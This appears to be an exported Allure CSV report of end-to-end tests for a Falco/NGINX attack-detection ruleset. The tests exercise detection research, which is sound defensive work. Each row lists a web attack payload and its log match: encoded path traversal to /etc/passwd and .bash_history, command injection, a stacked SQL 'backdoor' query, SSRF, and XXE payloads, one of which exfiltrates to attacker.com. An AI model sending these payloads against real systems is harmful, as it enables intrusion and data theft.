"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DBL_005` |
| **Name** | Double encoded bash history access |
| **Category** | PATH |
| **Subcategory** | double_encoded |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%252E%252E%252F%252E%252E%252Froot%252F.bash_history`
- **Encoded**: `%25252E%25252E%25252F%25252E%25252E%25252Froot%25252F.bash_history`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 13:44:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Encoded path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Encoded path traversal attack detected test_id=PATH_DBL_005-1771076661898-fpvqd7 pattern_id=PATH_DBL_005 uri=/?q=%25252E%25252E%25252F%25252E%25252E%25252Froot%25252F.bash_history client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_DBL_005-1771076661898-fpvqd7 pattern_id=PATH_DBL_005 uri=/?q=%25252E%25252E%25252F%25252E%25252E%25252Froot%25252F.bash_history client=127.0.0.1

**Falco Log Entry**:
```
13:44:21.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_DBL_005-1771076661898-fpvqd7 pattern_id=PATH_DBL_005 uri=/?q=%25252E%25252E%25252F%25252E%25252E%25252Froot%25252F.bash_history client=127.0.0.1
```","2","test_e2e_with_logs[243_PATH_DBL_005]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_PARAM_001` |
| **Name** | XXE Parameter Entity Chaining |
| **Category** | XXE |
| **Subcategory** | parameter_entity |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY % data SYSTEM ""http://attacker.com/collect""><!ENTITY % eval ""<!ENTITY exfil SYSTEM '%data;'>"">%eval;]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20data%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fcollect%22%3E%3C%21ENTITY%20%25%20eval%20%22%3C%21ENTITY%20exfil%20SYSTEM%20%27%25data%3B%27%3E%22%3E%25eval%3B%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 13:44:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_PARAM_001-1771076656339-uddfz6 pattern_id=XXE_PARAM_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20data%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fcollect%22%3E%3C%21ENTITY%20%25%20eval%20%22%3C%21ENTITY%20exfil%20SYSTEM%20%27%25data%3B%27%3E%22%3E%25eval%3B%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_PARAM_001-1771076656339-uddfz6 pattern_id=XXE_PARAM_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20data%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fcollect%22%3E%3C%21ENTITY%20%25%20eval%20%22%3C%21ENTITY%20exfil%20SYSTEM%20%27%25data%3B%27%3E%22%3E%25eval%3B%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
13:44:16.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_PARAM_001-1771076656339-uddfz6 pattern_id=XXE_PARAM_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20data%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fcollect%22%3E%3C%21ENTITY%20%25%20eval%20%22%3C%21ENTITY%20exfil%20SYSTEM%20%27%25data%3B%27%3E%22%3E%25eval%3B%5D%3E client=127.0.0.1
```","2","test_e2e_with_logs[582_XXE_PARAM_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_003` |
| **Name** | Mixed slash/backslash traversal |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\../`
- **Encoded**: `..%5C..%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 13:44:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Windows path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_003-1771076649370-jo0jh pattern_id=PATH_ADV_003 uri=/?q=..%5C..%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_003-1771076649370-jo0jh pattern_id=PATH_ADV_003 uri=/?q=..%5C..%2F client=127.0.0.1

**Falco Log Entry**:
```
13:44:09.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_003-1771076649370-jo0jh pattern_id=PATH_ADV_003 uri=/?q=..%5C..%2F client=127.0.0.1
```","2","test_e2e_with_logs[222_PATH_ADV_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_001` |
| **Name** | Quadruple dot traversal variation |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `....//`
- **Encoded**: `....%2F%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~70000ms
- **Timestamp**: 13:44:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_001-1771076643856-poztsm pattern_id=PATH_ADV_001 uri=/?q=....%2F%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_001-1771076643856-poztsm pattern_id=PATH_ADV_001 uri=/?q=....%2F%2F client=127.0.0.1

**Falco Log Entry**:
```
13:44:03.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_001-1771076643856-poztsm pattern_id=PATH_ADV_001 uri=/?q=....%2F%2F client=127.0.0.1
```","1","test_e2e_with_logs[220_PATH_ADV_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PP_PROTO_001` |
| **Name** | __proto__ Status Property Injection |
| **Category** | PROTOTYPE_POLLUTION |
| **Subcategory** | basic |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `?__proto__[status]=polluted`
- **Encoded**: `__proto__%5Bstatus%5D%3Dpolluted`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~20000ms
- **Timestamp**: 13:44:53.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX PP] Prototype pollution attack attempt` |
| **Matched Rule** | `[NGINX PP] Prototype pollution attack attempt test_id=PP_PROTO_001-1771076693345-crpt5p pattern_id=PP_PROTO_001 uri=/?q=__proto__%5Bstatus%5D%3Dpolluted client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX PP] Prototype pollution attack attempt test_id=PP_PROTO_001-1771076693345-crpt5p pattern_id=PP_PROTO_001 uri=/?q=__proto__%5Bstatus%5D%3Dpolluted client=127.0.0.1

**Falco Log Entry**:
```
13:44:53.000000000: Warning [NGINX PP] Prototype pollution attack attempt test_id=PP_PROTO_001-1771076693345-crpt5p pattern_id=PP_PROTO_001 uri=/?q=__proto__%5Bstatus%5D%3Dpolluted client=127.0.0.1
```","2","test_e2e_with_logs[590_PP_PROTO_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_DNS_002` |
| **Name** | Decimal IP Bypass for Localhost |
| **Category** | SSRF |
| **Subcategory** | dns_rebinding |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `http://2130706433/`
- **Encoded**: `http%3A%2F%2F2130706433%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~12000ms
- **Timestamp**: 13:45:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_DNS_002-1771076701841-qz8ue pattern_id=SSRF_DNS_002 uri=/?q=http%3A%2F%2F2130706433%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_DNS_002-1771076701841-qz8ue pattern_id=SSRF_DNS_002 uri=/?q=http%3A%2F%2F2130706433%2F client=127.0.0.1

**Falco Log Entry**:
```
13:45:01.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_DNS_002-1771076701841-qz8ue pattern_id=SSRF_DNS_002 uri=/?q=http%3A%2F%2F2130706433%2F client=127.0.0.1
```","2","test_e2e_with_logs[468_SSRF_DNS_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_005` |
| **Name** | Password file access attempt |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; cat /etc/passwd`
- **Encoded**: `%3B%20cat%20/etc/passwd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 13:43:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_005-1771076638332-ef734 pattern_id=CMD_BASIC_005 uri=/?q=%3B%20cat%20/etc/passwd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_005-1771076638332-ef734 pattern_id=CMD_BASIC_005 uri=/?q=%3B%20cat%20/etc/passwd client=127.0.0.1

**Falco Log Entry**:
```
13:43:58.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_005-1771076638332-ef734 pattern_id=CMD_BASIC_005 uri=/?q=%3B%20cat%20/etc/passwd client=127.0.0.1
```","2","test_e2e_with_logs[309_CMD_BASIC_005]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_003` |
| **Name** | XXE expect wrapper command execution |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""expect://id"">`
- **Encoded**: `%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 13:44:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_003-1771076652330-5vyqmsf pattern_id=XXE_ENTITY_003 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_003-1771076652330-5vyqmsf pattern_id=XXE_ENTITY_003 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E client=127.0.0.1

**Falco Log Entry**:
```
13:44:12.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_003-1771076652330-5vyqmsf pattern_id=XXE_ENTITY_003 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[493_XXE_ENTITY_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_BOLA_003` |
| **Name** | BOLA Admin User Profile Access |
| **Category** | API_SECURITY |
| **Subcategory** | bola |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/api/admin/users/100/profile`
- **Encoded**: `%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 13:44:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_BOLA_003-1771076681839-2bs4rr pattern_id=API_BOLA_003 uri=/?q=%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_003-1771076681839-2bs4rr pattern_id=API_BOLA_003 uri=/?q=%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile client=127.0.0.1

**Falco Log Entry**:
```
13:44:41.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_003-1771076681839-2bs4rr pattern_id=API_BOLA_003 uri=/?q=%2Fapi%2Fadmin%2Fusers%2F100%2Fprofile client=127.0.0.1
```","2","test_e2e_with_logs[411_API_BOLA_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_058` |
| **Name** | Semicolon Sleep Injection |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `; sleep 5`
- **Encoded**: `%3B%20sleep%205`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 13:44:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_ADV_058-1771076664892-xel1ob pattern_id=CMD_ADV_058 uri=/?q=%3B%20sleep%205 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_ADV_058-1771076664892-xel1ob pattern_id=CMD_ADV_058 uri=/?q=%3B%20sleep%205 client=127.0.0.1

**Falco Log Entry**:
```
13:44:24.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_ADV_058-1771076664892-xel1ob pattern_id=CMD_ADV_058 uri=/?q=%3B%20sleep%205 client=127.0.0.1
```","2","test_e2e_with_logs[286_CMD_ADV_058]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `GQL_FRAG_001` |
| **Name** | GraphQL fragment with typename introspection |
| **Category** | GRAPHQL |
| **Subcategory** | fragment |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `fragment F on User{id,secret}query{user{...F,__typename}}`
- **Encoded**: `fragment%20F%20on%20User%7Bid%2Csecret%7Dquery%7Buser%7B...F%2C__typename%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~48000ms
- **Timestamp**: 13:44:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX GraphQL Attack] Introspection query detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=GQL_FRAG_001-1771076665851-mdutgl pattern_id=GQL_FRAG_001 uri=/?q=fragment%20F%20on%20User%7Bid%2Csecret%7Dquery%7Buser%7B...F%2C__typename%7D%7D client=127.0.0.1` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=GQL_FRAG_001-1771076665851-mdutgl pattern_id=GQL_FRAG_001 uri=/?q=fragment%20F%20on%20User%7Bid%2Csecret%7Dquery%7Buser%7B...F%2C__typename%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
13:44:25.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=GQL_FRAG_001-1771076665851-mdutgl pattern_id=GQL_FRAG_001 uri=/?q=fragment%20F%20on%20User%7Bid%2Csecret%7Dquery%7Buser%7B...F%2C__typename%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[501_GQL_FRAG_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_006` |
| **Name** | Double URL encoded traversal |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%252e%252e%252f%252e%252e%252fetc/passwd`
- **Encoded**: `%25252e%25252e%25252f%25252e%25252e%25252fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~48000ms
- **Timestamp**: 13:44:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Encoded Path Traversal Attack` |
| **Matched Rule** | `[NGINX Traversal] Encoded path traversal attack detected test_id=PATH_UNI_006-1771076665407-ezwuwn pattern_id=PATH_UNI_006 uri=/?q=%25252e%25252e%25252f%25252e%25252e%25252fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_UNI_006-1771076665407-ezwuwn pattern_id=PATH_UNI_006 uri=/?q=%25252e%25252e%25252f%25252e%25252e%25252fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
13:44:25.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_UNI_006-1771076665407-ezwuwn pattern_id=PATH_UNI_006 uri=/?q=%25252e%25252e%25252f%25252e%25252e%25252fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[270_PATH_UNI_006]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DBL_003` |
| **Name** | Double encoded dot |
| **Category** | PATH |
| **Subcategory** | double_encoding |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%252e%252e/%252e%252e/%252e%252e/etc/passwd`
- **Encoded**: `%25252e%25252e%2F%25252e%25252e%2F%25252e%25252e%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 13:44:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_DBL_003-1771076654381-k72q9k pattern_id=PATH_DBL_003 uri=/?q=%25252e%25252e%2F%25252e%25252e%2F%25252e%25252e%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_DBL_003-1771076654381-k72q9k pattern_id=PATH_DBL_003 uri=/?q=%25252e%25252e%2F%25252e%25252e%2F%25252e%25252e%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
13:44:14.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_DBL_003-1771076654381-k72q9k pattern_id=PATH_DBL_003 uri=/?q=%25252e%25252e%2F%25252e%25252e%2F%25252e%25252e%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[241_PATH_DBL_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_STACK_004` |
| **Name** | Backdoor table creation attempt |
| **Category** | SQLI |
| **Subcategory** | stacked_queries |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; CREATE TABLE backdoor (id INT, cmd VARCHAR(255)); --`
- **Encoded**: `%27%3B%20CREATE%20TABLE%20backdoor%20%28id%20INT%2C%20cmd%20VARCHAR%28255%29%29%3B%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~65000ms
- **Timestamp**: 13:44:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_004-1771076648390-jw4xu3 pattern_id=SQLI_STACK_004 uri=/?q=%27%3B%20CREATE%20TABLE%20backdoor%20%28id%20INT%2C%20cmd%20VARCHAR%28255%29%29%3B%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_004-1771076648390-jw4xu3 pattern_id=SQLI_STACK_004 uri=/?q=%27%3B%20CREATE%20TABLE%20backdoor%20%28id%20INT%2C%20cmd%20VARCHAR%28255%29%29%3B%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:08.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_STACK_004-1771076648390-jw4xu3 pattern_id=SQLI_STACK_004 uri=/?q=%27%3B%20CREATE%20TABLE%20backdoor%20%28id%20INT%2C%20cmd%20VARCHAR%28255%29%29%3B%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[092_SQLI_STACK_004]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
